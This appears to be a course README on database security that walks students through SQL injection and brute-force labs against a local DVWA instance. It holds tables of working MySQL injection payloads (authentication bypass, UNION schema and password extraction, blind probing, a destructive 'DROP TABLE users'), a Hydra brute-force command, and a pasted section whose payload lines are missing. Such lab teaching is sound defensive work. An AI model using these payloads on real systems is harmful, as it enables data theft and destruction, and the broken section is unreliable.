# Database Security - SQL Injection 


## What is a database? 

- It is an organized collection of data that is stored and managed electronically. 
- It allows users and systems to efficiently retrieve, update, and manage data. 
- Databases are commonly used in various applications (Business Management Systems, Social Media Platforms, Health Management Systems)

###  Key Features of a Database
- **Data Storage**: Stores structured or unstructured data for easy access.
- **Data Management**: Enables adding, updating, and deleting data systematically.
- **Data Retrieval**: Supports queries to find and display specific information.
- **Scalability**: Handles growing amounts of data over time.
- **Data Relationships**: Links related pieces of information using tables or schemas.

### Types of Databases
1. **Relational Databases**:
   - Data is stored in structured tables with rows and columns.
   - Example: MySQL, PostgreSQL, Microsoft SQL Server.

2. **NoSQL Databases**:
   - Used for unstructured or semi-structured data.
   - Example: MongoDB, CouchDB.

3. **Cloud Databases**:
   - Hosted on cloud platforms, providing scalability and accessibility.
   - Example: AWS RDS, Google Cloud Firestore.

4. **Flat File Databases**:
   - Data is stored in plain text or spreadsheets without relationships.
   - Example: CSV files.

## Database Security

Database Security refers to the **measures and technologies** used to protect a database from **unauthorized access, misuse, corruption, and breaches**. It ensures that the **integrity, confidentiality, and availability (CIA Triad)** of data are maintained.

### Why is Database Security Important?

1. **Protecting Sensitive Information**:
   - Databases often store critical information like personal data, financial records, and trade secrets.
2. **Preventing Unauthorized Access**:
   - Restricts malicious actors or unauthorized personnel from accessing or modifying data.

3. **Ensuring Data Integrity**:
   - Protects data from being tampered with, ensuring it remains accurate and reliable.
4. **Regulatory Compliance**:
   - Many industries require data protection to meet legal standards (GDPR).
5. **Minimizing Financial and Reputational Damage**:
   - A data breach can lead to monetary loss and damage to an organization’s reputation.


## Common Threats to Database Security

1. **SQL Injection**: ***Attackers manipulate queries to gain unauthorized access or extract sensitive data.*** [Read More](https://owasp.org/Top10/A03_2021-Injection/)
2. **Unauthorized Access**: Exploiting weak passwords or unprotected access points.
3. **Malware Attacks**: Malicious software that corrupts or steals data.
4. **Insider Threats**: Employees or contractors misusing their access.
5. **Data Breaches**: Exfiltration of sensitive information by cybercriminals.


## How Databases Fit into the Cybersecurity Framework

**NIST Cybersecurity Framework**

- **Identify**: Understand where critical data is stored in the database.
- **Protect**: Implement measures like encryption, access control, and firewalls.
- **Detect**: Use monitoring tools to identify potential intrusions.
- **Respond**: Have incident response plans ready to handle database breaches.
- **Recover**: Ensure database backups are available to restore operations quickly.

## The Role of Cybersecurity Professionals in Database Security

- ***Database Administrators (DBAs) and Cybersecurity Teams work together to***:
   - Secure database infrastructure.
   - Monitor for threats and vulnerabilities.
   - Ensure compliance with data protection regulations.

- **Penetration Testers** simulate attacks to uncover vulnerabilities.

- **Incident Responders** address breaches and ensure rapid recovery.

# Recent Data Breach Incidents in Finland

## **1. Vastaamo Data Breach**
- **Timeline**:
  - **First Breach**: November 2018
  - **Second Breach**: March 2019
  - **Breaches Discovered**: October 2020
- **Nature of Attack**:
  - Unauthorized access to sensitive mental health records during 2018 and 2019.
- **Impact**:
  - Affected approximately **33,000 patients**.
  - Exposed therapy notes and personal details, leading to extortion attempts targeting both patients and the organization.
- **Consequences**:
  - Vastaamo declared bankruptcy following the breach.
  - Legislative changes in Finland were fast-tracked, allowing individuals to update their personal identity codes in cases of significant data breaches.  
  - **[Read more](https://yle.fi/a/3-11645651)**

---

## **2. Helsinki Municipality Data Breach**
- **Timeline**:
  - **Incident Date**: April 2024
- **Nature of Attack**:
  - Attackers exploited a vulnerability in the city’s education division server.
- **Impact**:
  - Initially reported to affect up to **120,000 individuals**, including students, guardians, and staff.
  - Later investigations revealed approximately **300,000 individuals** were impacted, exposing:
    - Names
    - Identification numbers
    - Addresses
- **Response**:
  - The city promptly shut down compromised systems and initiated investigations.
  - Highlighted the necessity for improved vulnerability management in municipal systems.
  - **[Read more](https://yle.fi/a/74-20124891)**

## What is SQL injection?

- It is a type of cyberattack where an attacker manipulates a web application’s SQL query by injecting malicious input into input fields (e.g., login forms, search bars)
- **How it works?**
   - Vulnerable Query: A web application executes SQL queries using user inputs without proper validation or sanitization. ```SELECT * FROM users WHERE username = 'input' AND password = 'input';```
   - Malicious Input: Exploits applications that improperly handle user input in SQL queries. An attacker provides an input like ```' OR '1'='1``` alters the intended SQL logic.
- **Common Targets**: Login forms, search bars, and any input fields interacting with a database.
- **Impacts**
   - Data theft (e.g., extracting usernames and passwords).
   - Unauthorized access (e.g., bypassing authentication).
   - Data manipulation or deletion.
   - Potential system compromise.

***SQL Injection is a critical vulnerability listed in the OWASP Top 10 security risks.***

# DAMN VULNERABLE WEB APPLICATION 

The Damn Vulnerable Web Application (DVWA) is designed to help students practice and understand some of the most common web vulnerabilities, including SQL Injection, brute force attacks, Cross-Site Scripting (XSS), and more. It provides a controlled environment for students to learn how these attacks work and explore techniques for securing applications against them.

***Warning: DVWA is intentionally insecure! Do not upload or deploy it on any publicly accessible server or web hosting service. If exposed to the internet, it will almost certainly be compromised***

# Setting Up DVWA with Docker

You can set up DVWA (Damn Vulnerable Web Application) by forking this repository to your GitHub account and then cloning it to your local environment. This repository includes a custom `php.ini` file to ensure that all necessary PHP configurations are met for the DVWA environment.

## Prerequisites

- Ensure you have **Docker** installed and running on your device.

## Installation Steps

1. **Fork the Repository**
   - First, go to the DVWA repository on GitHub and fork it to your own GitHub account.

2. **Clone Your Forked Repository**
   - Clone the forked repository to your local device:
     ```bash
     git clone https://github.com/yourusername/dvwa.git
     ```
   - Replace `yourusername` with your GitHub username.

3. **Open the Project Directory**

4. **Start the DVWA Container**
   - Run the following command to start DVWA:
     ```bash
     docker-compose up -d
     ```
   - This will launch the DVWA container with the required environment, including the `php.ini` configuration file included in the repository to meet DVWA’s setup requirements.

5. **Access DVWA in Your Browser**
   - Open your browser and go to `http://localhost:89`.
   - Log in with the following credentials:
     - **Username**: `admin`
     - **Password**: `password`

### Notes

- **PHP Configuration**: The repository includes a custom `php.ini` file that configures essential PHP settings for DVWA. This file ensures compatibility with DVWA requirements.
- **Port Configuration**: If `localhost:89` is already in use, you can update the port in the `docker-compose.yml` file.
- **Security Warning**: DVWA is intentionally vulnerable. **Do not deploy this on any publicly accessible server**.




## Practical Tasks 
https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection
### SQL Injection Exercise

This exercise will help you understand how SQL Injection works and explore methods to prevent it.

1. **Access DVWA**:
   - Open your browser and navigate to `http://localhost:89`.

2. **Log In to DVWA**:
   - Use the credentials: **Username**: `admin`, **Password**: `password`.

3. **Set Security Level**:
   - Go to the **DVWA Security** tab and set the security level to **Low**.

4. **Select the SQL Injection Module**:
   - In the left sidebar, select **SQL Injection** from the list of modules.

5. **Perform a Basic SQL Injection**:
   - You will see a field where you can enter a **User ID** to retrieve information from the database.
   - Normally, entering `1` and clicking **Submit** returns information associated with User ID 1.

6. **Inject SQL Payload**:
   - Now, let’s attempt a simple SQL Injection. Instead of entering `1`, try entering:
     ```
     1' OR '1'='1
     ```
   - Click **Submit**.

7. **Analyze the Response**:
   - If the application is vulnerable, you should see multiple rows of user information returned, not just the data for User ID 1.
   - **Explanation**: The SQL query in the backend interprets `1' OR '1'='1` as always being true, causing it to retrieve all records from the database.

# SQL Injection on MySQL

| **Use Case**                      | **Payload**                                                            | **Explanation**                                                                                   | **Expected Behavior**                                                                                       |
|-----------------------------------|------------------------------------------------------------------------|---------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------|
| **Authentication Bypass**         | `' OR '1'='1 --`                                                      | Bypasses authentication by injecting an always-true condition.                                   | Logs in successfully without valid credentials.                                                             |
| **Extract Database Version**      | `1' UNION SELECT null, @@version --`                                  | Retrieves the database version (`@@version` is MySQL-specific).                                  | Displays the MySQL version, e.g., `8.0.28`.                                                                 |
| **Retrieve Current Database Name**| `1' UNION SELECT null, database() --`                                 | Extracts the name of the currently selected database.                                             | Displays the database name, e.g., `dvwa`.                                                                   |
| **List All Tables**               | `1' UNION SELECT null, table_name FROM information_schema.tables --`  | Fetches all table names from the `information_schema.tables`.                                     | Displays a list of table names such as `users`, `logs`, etc.                                                |
| **List Columns in a Table**       | `1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users' --` | Lists column names in the `users` table.                                                         | Displays column names like `id`, `username`, `password`.                                                   |
| **Time-Based Blind Injection**    | `1' AND IF(1=1, SLEEP(5), null) --`                                   | Delays response by 5 seconds if the condition `1=1` is true. Useful for blind SQL Injection.      | A 5-second delay confirms successful injection.                                                             |
| **Extract Single Character from Data** | `1' AND ASCII(SUBSTR((SELECT password FROM users LIMIT 1), 1, 1)) > 65 --` | Retrieves the ASCII value of the first character in the password of the first user.              | Helps reconstruct passwords character by character through binary search.                                   |
| **Boolean-Based Blind Injection** | `1' AND (SELECT LENGTH(password) FROM users WHERE username='admin') = 8 --` | Checks if the password length for the user `admin` is 8 characters.                              | Returns a valid response if the length is correct, otherwise no response.                                   |

---

## **Notes**
1. **Testing Environment**: Perform these tests in a controlled environment like DVWA.
2. **Ethical Use**: Ensure you have proper authorization before performing any security tests.
3. **Impact**: These payloads demonstrate how SQL Injection can extract sensitive data or manipulate database behavior.


# SQL Injection Payloads for MySQL

| **Type of Injection**    | **Payload**                                | **Explanation**                                                                                 | **Example**                                                                                                                                   |
|---------------------------|--------------------------------------------|-------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------|
| **Union-Based**           | `1' UNION SELECT null, version(), database() --` | Combines results of multiple SELECT queries to extract information.                              | Retrieves database version and name.                                                                                                         |
| **Error-Based**           | `1' AND CONVERT(@@version USING latin1) --` | Forces the database to generate an error that reveals details like the database version.         | Outputs an error message exposing `@@version` information.                                                                                   |
| **Boolean-Based Blind**   | `1' AND 1=1 --` <br> `1' AND 1=2 --`       | Checks how the application responds to true/false conditions to infer information.              | A valid response for `1=1` and no response for `1=2` indicate a vulnerability.                                                               |
| **Time-Based Blind**      | `1' AND IF(1=1, SLEEP(5), null) --`        | Delays server response if the condition is true to confirm successful injection.                 | A 5-second delay indicates successful injection.                                                                                             |
| **Stacked Queries**       | `1'; DROP TABLE users --`                  | Executes multiple SQL statements in one query, often leading to destructive actions.             | Deletes the `users` table if stacking is allowed.                                                                                            |
| **Second-Order**          | `test' --`                                 | Injects SQL during one interaction (e.g., registration) and exploits it in another (e.g., login). | Register with `test' --` and then log in as `test` to bypass authentication or manipulate other queries.                                      |



## **Detailed Explanations**

### **Union-Based Injection**
- **Description**: Combines results from multiple SELECT queries.
- **Example Query**:
  ```sql
  SELECT * FROM users WHERE id = '1' UNION SELECT null, version(), database();


#### How to Prevent SQL Injection

After observing this vulnerability, consider how SQL Injection could be mitigated:

- **Prepared Statements**: Use parameterized queries instead of directly concatenating user inputs into SQL commands. This ensures user inputs are treated as data, not executable code.
  
- **Input Validation**: Only allow specific, expected formats (e.g., ensure only integers are allowed for IDs) to prevent malicious input from altering SQL queries.

- **Escaping Special Characters**: Escape special characters like quotes to prevent user inputs from being interpreted as part of the SQL command.

This exercise demonstrates the importance of secure coding practices to protect applications from SQL Injection attacks.


### Brute Force Exercise

This exercise demonstrates how brute force attacks attempt to guess passwords by systematically trying different combinations.

1. **Access DVWA**:
   - Open your browser and navigate to `http://localhost:89`.

2. **Log In to DVWA**:
   - Use the credentials: **Username**: `admin`, **Password**: `password`.

3. **Set Security Level**:
   - Go to the **DVWA Security** tab and set the security level to **Low**.

4. **Select the Brute Force Module**:
   - In the left sidebar, select **Brute Force** from the list of modules.

5. **Prepare a Password List**:
   - Create a file named `passwords.txt` with a few sample passwords:
     ```plaintext
     password
     admin
     123456
     password123
     letmein
     ```

6. **Use Hydra to Perform the Attack**:

Note we need to install hydra 

in Ubuntu/debian run the following command 
sudo apt update
sudo apt install hydra -y

You can also do it in WSL ubuntu 

sudo apt update
sudo apt install hydra -y

Verify Installation

hydra -h

   - Open a terminal and run the following Hydra command to brute force the login:
     ```bash
     hydra -l admin -P passwords.txt localhost http-post-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^:Login failed"
     ```
   - **Explanation**:
     - `-l admin` specifies the username.
     - `-P passwords.txt` specifies the file with password guesses.
     - `localhost` is the DVWA server.
     - `http-post-form` is the method, and `"Login failed"` tells Hydra how to identify a failed attempt.

7. **Review the Results**:
   - Hydra will try each password until it finds the correct one, displaying the successful login credentials.

#### Preventing Brute Force Attacks

Consider these techniques to prevent brute force attacks:
- **Account Lockout**: Temporarily lock accounts after multiple failed attempts.
- **Rate Limiting**: Limit the number of login attempts in a given time period.
- **Strong Password Policies**: Require complex passwords to reduce vulnerability to guessing attacks.

This exercise demonstrates the risk of weak passwords and the importance of enforcing security measures to prevent brute force attacks.

[**Read More**](https://github.com/digininja/DVWA)




----------------------

To demonstrate SQL injection and brute force attack steps using DVWA, you can follow these instructions. Note that these actions should only be performed in a controlled environment, such as DVWA, which is designed for educational purposes and security testing.
SQL Injection Steps
1. Access DVWA: Open your web browser and navigate to http://localhost. Log in using the default credentials (username: admin, password: password).
Set Security Level: Go to the "DVWA Security" page and set the security level to "Low" to make SQL injection easier.
Navigate to SQL Injection: Click on the "SQL Injection" link in the left sidebar.
Perform SQL Injection:
In the input field (e.g., "User ID"), enter the following payload:
- Click the "Submit" button. This payload exploits the SQL query by always returning true, allowing you to bypass authentication or retrieve data.
View Results: If successful, you should see the results of the SQL query, which may include sensitive information from the database.
Brute Force Attack Steps
1. Set Security Level: Ensure the DVWA security level is set to "Low" for the brute force attack demonstration.
Navigate to Brute Force: Click on the "Brute Force" link in the left sidebar.
3. Perform Brute Force Attack:
In the "Username" field, enter admin.
In the "Password" field, you can use a simple password list or try common passwords like password, 123456, etc.
Click the "Login" button.
4. Automate Brute Force (Optional): For a more automated approach, you can use tools like Hydra or Burp Suite to perform a brute force attack against the login page. Here’s an example command using Hydra:
Bash
Replace /path/to/passwords.txt with the path to your password list.
Important Notes
Ethical Considerations: Always ensure you have permission to test any application for vulnerabilities. DVWA is specifically designed for this purpose.
Security Levels: DVWA has different security levels (Low, Medium, High) that affect the difficulty of the attacks. For educational purposes, start with "Low".
Environment: Perform these tests in a safe, isolated environment to avoid any legal or ethical issues.
By following these steps, you can effectively demonstrate SQL injection and brute force attacks using DVWA.


Additional SQL Injection Techniques
1. Union-Based SQL Injection:
Input: In the "User ID" field, enter:
- Explanation: This query attempts to combine the results of the original query with the results from the users table, allowing you to retrieve usernames and passwords.
Error-Based SQL Injection:
Input: In the "User ID" field, enter:
- Explanation: This query forces an error that reveals the version of the database server. The CONVERT function is used to manipulate the output.
3. Time-Based Blind SQL Injection:
Input: In the "User ID" field, enter:
- Explanation: This query uses the SLEEP function to create a delay if the condition is true. If the application takes longer than usual to respond, it indicates that the injection was successful.
Boolean-Based Blind SQL Injection:
Input: In the "User ID" field, enter:
- Input: In the "User ID" field, enter:
- Explanation: The first input should return a valid response, while the second should not. This technique helps determine if the application is vulnerable to SQL injection by checking the response based on true/false conditions.
5. Second-Order SQL Injection:
Input: First, register a new user with a username like:
- Input: Then, try to log in with:
- Explanation: This technique involves injecting SQL during one interaction (like registration) and then exploiting it in another (like login). It demonstrates how data can be manipulated across different application states.
Stacked Queries:
Input: In the "User ID" field, enter:
- Explanation: This query attempts to execute multiple SQL statements in one go. If the application allows it, this could lead to data loss. Note that many applications have protections against this type of injection.
Important Considerations
Testing Environment: Always perform these tests in a controlled environment like DVWA, which is designed for learning and testing security vulnerabilities.
Security Levels: Adjust the security level in DVWA to see how it affects the success of these injections. Higher security levels may have protections in place.
Ethical Hacking: Ensure you have permission to test any application for vulnerabilities. These techniques should only be used in legal and ethical contexts.
By experimenting with these additional SQL injection techniques, you can gain a deeper understanding of how SQL injection vulnerabilities can be exploited.



## Important Notes
### Ethical Considerations
- Always ensure you have permission to test any application for vulnerabilities. DVWA is designed for educational purposes and controlled testing.
### Security Levels
- DVWA supports different security levels (Low, Medium, High). Start with "Low" to understand vulnerabilities, then increase the level to explore mitigation techniques.
### Testing Environment
- Perform these tests in a safe, isolated environment like DVWA to avoid any legal or ethical issues.



### Recommended Resources for Database Security

#### OWASP Top 10 Database Security Risks
- **Description**: Covers injection attacks, misconfigurations, and access control vulnerabilities as they relate to databases.
- **URL**: [https://owasp.org/www-project-data-security-top-10/](https://owasp.org/www-project-data-security-top-10/)
<details>
  <summary>Read More</summary>
  OWASP provides an in-depth guide on common vulnerabilities affecting databases, including injection flaws, broken authentication, and misconfigurations. It highlights both risks and best practices for securing sensitive data.
</details>

---

#### NIST Cybersecurity Database Guidelines
- **Description**: Offers guidelines on protecting databases in compliance with global standards.
- **URL**: [https://csrc.nist.gov/](https://csrc.nist.gov/)
<details>
  <summary>Read More</summary>
  NIST’s guidelines provide comprehensive frameworks for securing databases, covering aspects like encryption, access controls, and incident response. These are particularly useful for aligning with international security standards.
</details>

---

#### Microsoft Learn: Database Security Best Practices
- **Description**: Focuses on securing Microsoft SQL Server databases and mitigating common threats.
- **URL**: [https://azure.microsoft.com/en-us/resources/cloud-computing-dictionary/what-is-database-security](https://azure.microsoft.com/en-us/resources/cloud-computing-dictionary/what-is-database-security)

### Tools to Explore Database Threats
- [SQLMAP](https://sqlmap.org/)